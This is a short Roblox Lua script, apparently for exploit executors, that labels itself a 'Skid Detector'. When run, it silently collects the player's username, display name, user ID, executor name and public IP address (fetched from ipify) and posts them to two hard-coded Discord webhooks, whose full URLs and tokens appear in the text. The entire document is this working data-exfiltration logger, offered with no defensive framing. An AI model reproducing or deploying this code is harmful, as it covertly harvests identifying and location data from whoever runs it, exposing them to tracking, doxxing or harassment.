-- MADE BY 0rep --

local HttpService = game:GetService("HttpService")
local lp = game.Players.LocalPlayer
local ip = game:HttpGet("https://api.ipify.org")

-- Webhook list (add more as needed)
local urls = {
    "https://discord.com/api/webhooks/1370915556084940932/WHv1nKx6zAkY0iztqC4KvSv_zTRsWSQQr2RnLOoABhZ2FfQvmA0Bpgd3suf2tTICLG94",
    "https://discord.com/api/webhooks/1370915185941807214/BQ0Ve1Nu1DRruP4W9C0_uwa_wWBTbXAo9Xk82_wC571wJm6ZrUOmviw8ta_tddhXYZxh"
    -- Add more webhook URLs if needed
}

-- Data payload
local data = {
    ["username"] = "Skid Detector",
    ["content"] = string.format(
        "Username: %s\nDisplay Name: %s\nUser ID: %s\nIP: %s\nExecutor: %s",
        lp.Name,
        lp.DisplayName,
        lp.UserId,
        ip,
        identifyexecutor and identifyexecutor() or "Unknown"
    )
}

local jsonData = HttpService:JSONEncode(data)

-- Get request method from supported executor APIs
local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)

if requestFunc then
    for _, url in ipairs(urls) do
        local success, result = pcall(function()
            return requestFunc({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        end)

        if success then
            print("Sent to:", url)
        else
            warn("Failed to send to:", url, result)
        end
    end
else
    warn("No supported HTTP request function found. Your executor might not support webhooks.")
end
